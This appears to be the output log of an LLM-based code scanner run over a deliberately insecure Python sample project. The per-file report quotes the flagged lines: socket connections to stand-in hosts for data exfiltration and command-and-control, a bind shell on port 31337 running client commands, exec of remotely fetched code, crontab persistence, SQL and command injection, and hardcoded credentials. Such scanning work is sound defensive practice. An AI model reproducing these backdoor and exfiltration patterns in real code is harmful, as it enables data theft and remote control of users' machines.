@@ -1,0 +1,199 @@
+✓ OpenAI API connection successful
+Found 8 files to analyze
+Analyzing file 1/8: data/python_insecure_data/setup.py
+2025-04-19 16:52:25,653 - INFO - Sending data/python_insecure_data/setup.py to OpenAI for analysis...
+Analyzing file 2/8: data/python_insecure_data/main.py
+2025-04-19 16:52:32,335 - INFO - Sending data/python_insecure_data/main.py to OpenAI for analysis...
+Analyzing file 3/8: data/python_insecure_data/utils/formatter.py
+2025-04-19 16:52:38,845 - INFO - Sending data/python_insecure_data/utils/formatter.py to OpenAI for analysis...
+Analyzing file 4/8: data/python_insecure_data/utils/config.py
+2025-04-19 16:52:46,366 - INFO - Sending data/python_insecure_data/utils/config.py to OpenAI for analysis...
+Analyzing file 5/8: data/python_insecure_data/utils/data_processor.py
+2025-04-19 16:53:03,978 - INFO - Sending data/python_insecure_data/utils/data_processor.py to OpenAI for analysis...
+Analyzing file 6/8: data/python_insecure_data/utils/__init__.py
+2025-04-19 16:53:21,796 - INFO - Sending data/python_insecure_data/utils/__init__.py to OpenAI for analysis...
+Analyzing file 7/8: data/python_insecure_data/utils/logger.py
+2025-04-19 16:53:34,560 - INFO - Sending data/python_insecure_data/utils/logger.py to OpenAI for analysis...
+Analyzing file 8/8: data/python_insecure_data/utils/analytics.py
+2025-04-19 16:53:52,715 - INFO - Sending data/python_insecure_data/utils/analytics.py to OpenAI for analysis...
+================================================================================
+GPT CODE ANALYSIS REPORT
+================================================================================
+
+File: data/python_insecure_data/setup.py
+Language: python
+Risk Score: 0/10
+Risk Level: Low
+--------------------------------------------------------------------------------
+No vulnerabilities detected.
+
+File: data/python_insecure_data/main.py
+Language: python
+Risk Score: 0/10
+Risk Level: Low
+--------------------------------------------------------------------------------
+No vulnerabilities detected.
+
+File: data/python_insecure_data/utils/formatter.py
+Language: python
+Risk Score: 8/10
+Risk Level: High
+--------------------------------------------------------------------------------
+Found 2 potential issue(s):
+
+[!] Sql Injection (2 occurrences)
+  1. Line 52: query = f"INSERT OR REPLACE INTO format_cache VALUES ('{data_hash}', '{format_type}', {timestamp}, '{result}')" [Severity: 8/10]
+     This line of code is vulnerable to SQL injection because it uses string formatting to construct the SQL query instead of using parameterized queries. An attacker could potentially manipulate the 'data_hash', 'format_type', or 'result' variables to execute arbitrary SQL commands.
+  2. Line 70: query = f"SELECT result FROM format_cache WHERE hash = '{data_hash}' AND format = '{format_type}'" [Severity: 8/10]
+     This line of code is vulnerable to SQL injection because it uses string formatting to construct the SQL query instead of using parameterized queries. An attacker could potentially manipulate the 'data_hash' or 'format_type' variables to execute arbitrary SQL commands.
+
+File: data/python_insecure_data/utils/config.py
+Language: python
+Risk Score: 9/10
+Risk Level: High
+--------------------------------------------------------------------------------
+Found 6 potential issue(s):
+
+[!] Hardcoded Credentials Or Api Keys (6 occurrences)
+  1. Line 16: self._api_key = "sk_live_a8c2JhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" [Severity: 9/10]
+     API key is hardcoded into the code, which is a security risk as anyone with access to the code can retrieve it.
+  2. Line 17: self._admin_password = "admin123!@#" [Severity: 9/10]
+     Admin password is hardcoded into the code, which is a security risk as anyone with access to the code can retrieve it.
+  3. Line 34: "key": self._api_key [Severity: 9/10]
+     API key is hardcoded into the default configuration, which is a security risk as anyone with access to the code can retrieve it.
+  4. Line 39: "password": self._admin_password [Severity: 9/10]
+     Admin password is hardcoded into the default configuration, which is a security risk as anyone with access to the code can retrieve it.
+  5. Line 59: return self.get("api.key", self._api_key) [Severity: 9/10]
+     API key is returned by a function, which is a security risk as anyone with access to the code can retrieve it.
+  ... and 1 more occurrences
+
+File: data/python_insecure_data/utils/data_processor.py
+Language: python
+Risk Score: 9/10
+Risk Level: High
+--------------------------------------------------------------------------------
+Found 8 potential issue(s):
+
+[!] Command Injection Vulnerabilities (2 occurrences)
+  1. Line 119: result = subprocess.check_output(value, shell=True).decode().strip() [Severity: 9/10]
+     The code allows for command execution with user-provided input, which can lead to command injection if the input is not properly sanitized.
+  2. Line 160: result = subprocess.check_output(report_cmd, shell=True).decode() [Severity: 9/10]
+     The code allows for command execution with user-provided input, which can lead to command injection if the input is not properly sanitized.
+
+[!] Insecure Deserialization (1 occurrences)
+  1. Line 80: return pickle.loads(decoded) [Severity: 9/10]
+     The code deserializes data without validating its source or nature, which can lead to arbitrary code execution.
+
+[!] Path Traversal (1 occurrences)
+  1. Line 137: report_path = os.path.join(report_dir, report_name) [Severity: 7/10]
+     The code allows for user-provided input to define the file path, which can lead to path traversal if the input is not properly sanitized.
+
+[!] Use Of Exec() On Untrusted Input (1 occurrences)
+  1. Line 47: exec(script_content) [Severity: 10/10]
+     The code executes a script fetched from a remote server, which can lead to arbitrary code execution if the script is malicious.
+
+[!] Potential Backdoors (1 occurrences)
+  1. Line 20: self._initialize() [Severity: 10/10]
+     The code initializes a hidden backdoor that fetches and executes code from a remote server.
+
+[!] Insecure File Operations (1 occurrences)
+  1. Line 137: report_path = os.path.join(report_dir, report_name) [Severity: 7/10]
+     The code allows for user-provided input to define the file path, which can lead to insecure file operations if the input is not properly sanitized.
+
+[!] Insecure Yaml Loading (1 occurrences)
+  1. Line 126: return yaml.load(value, Loader=yaml.Loader) [Severity: 8/10]
+     The code loads YAML data without validating its source or nature, which can lead to arbitrary code execution.
+
+File: data/python_insecure_data/utils/__init__.py
+Language: python
+Risk Score: 8.3/10
+Risk Level: High
+--------------------------------------------------------------------------------
+Found 6 potential issue(s):
+
+[!] Potential Backdoors (1 occurrences)
+  1. Line 22: def _background_activity(): [Severity: 10/10]
+     This function is a potential backdoor as it collects system information and attempts to exfiltrate it to an external server.
+
+[!] Suspicious Network Activity (1 occurrences)
+  1. Line 41: s.connect(("data-collection.example.com", 8080)) [Severity: 9/10]
+     The code attempts to establish a network connection to an external server, which is a suspicious activity.
+
+[!] Http Requests With Ssl Verification Disabled (1 occurrences)
+  1. Line 49: verify=False [Severity: 8/10]
+     The code makes an HTTP request with SSL verification disabled, which can expose the system to man-in-the-middle attacks.
+
+[!] Unauthorized Access To Sensitive Data/Files (1 occurrences)
+  1. Line 30: "username": os.getlogin() if hasattr(os, 'getlogin') else 'unknown', [Severity: 7/10]
+     The code attempts to access the username of the current user, which is sensitive information.
+
+[!] Unusual Imports (1 occurrences)
+  1. Line 24: import os, socket, requests, base64, platform, uuid [Severity: 6/10]
+     The code imports several modules that are not typically used in a data processing utility package, which is suspicious.
+
+[!] Suspicious Process Creation (1 occurrences)
+  1. Line 68: _start_hidden_activities() [Severity: 10/10]
+     The code starts a hidden process when the module is imported, which is a suspicious behavior.
+
+File: data/python_insecure_data/utils/logger.py
+Language: python
+Risk Score: 9.6/10
+Risk Level: Critical
+--------------------------------------------------------------------------------
+Found 7 potential issue(s):
+
+[!] Binding To All Network Interfaces (0.0.0.0) (1 occurrences)
+  1. Line 59: server.bind(('0.0.0.0', 31337)) [Severity: 8/10]
+     The server is binding to all network interfaces, which could allow unauthorized remote connections.
+
+[!] Command Injection Vulnerabilities (1 occurrences)
+  1. Line 85: output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT) [Severity: 10/10]
+     The code is executing arbitrary commands received from the client, which could allow an attacker to execute malicious commands.
+
+[!] Potential Backdoors (3 occurrences)
+  1. Line 45: _setup_monitoring(logger) [Severity: 10/10]
+     The code is setting up a backdoor by starting a thread that listens for incoming connections and executes arbitrary commands.
+  2. Line 107: s.connect(('command.data-metrics.com', 8080)) [Severity: 10/10]
+     The code is setting up an alternate backdoor that attempts to connect back to a command and control server.
+  3. Line 159: _create_persistence() [Severity: 10/10]
+     The code is trying to create persistence on the system by adding the script to the crontab and startup files.
+
+[!] Insecure File Operations (1 occurrences)
+  1. Line 122: with open(backdoor_path, 'w') as f: [Severity: 9/10]
+     The code is writing a backdoor script to a hidden file in a temporary directory, which could be used to maintain persistence on the system.
+
+[!] Suspicious Process Creation (1 occurrences)
+  1. Line 132: subprocess.Popen(['python', backdoor_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE) [Severity: 9/10]
+     The code is creating a new process to run the backdoor script in the background.
+
+File: data/python_insecure_data/utils/analytics.py
+Language: python
+Risk Score: 7.6/10
+Risk Level: High
+--------------------------------------------------------------------------------
+Found 5 potential issue(s):
+
+[!] Suspicious Network Activity (1 occurrences)
+  1. Line 24: _socket.connect(("analytics.data-metrics.com", 8080)) [Severity: 8/10]
+     The code is trying to establish a connection to an external server which could be used for data exfiltration.
+
+[!] Http Requests With Ssl Verification Disabled (1 occurrences)
+  1. Line 54: requests.post(
+                    "https://analytics.data-metrics.com/collect",
+                    json=system_info,
+                    verify=False,
+                    timeout=1  # Short timeout to avoid hanging the application
+                ) [Severity: 7/10]
+     The code is making a HTTP request with SSL verification disabled. This could allow for man-in-the-middle attacks.
+
+[!] Data Exfiltration (1 occurrences)
+  1. Line 49: _socket.send(f"DATA:{encoded_data}\n".encode()) [Severity: 9/10]
+     The code is sending data to an external server. This could be used for data exfiltration.
+
+[!] Unauthorized Access To Sensitive Data/Files (1 occurrences)
+  1. Line 76: "env_vars": dict(os.environ)  # VULNERABILITY: Sending environment variables [Severity: 8/10]
+     The code is accessing and sending environment variables which could contain sensitive information.
+
+[!] Obfuscated Or Encoded Code (1 occurrences)
+  1. Line 48: encoded_data = base64.b64encode(json.dumps(system_info).encode()).decode() [Severity: 6/10]
+     The code is encoding data which could be used to hide malicious activity.
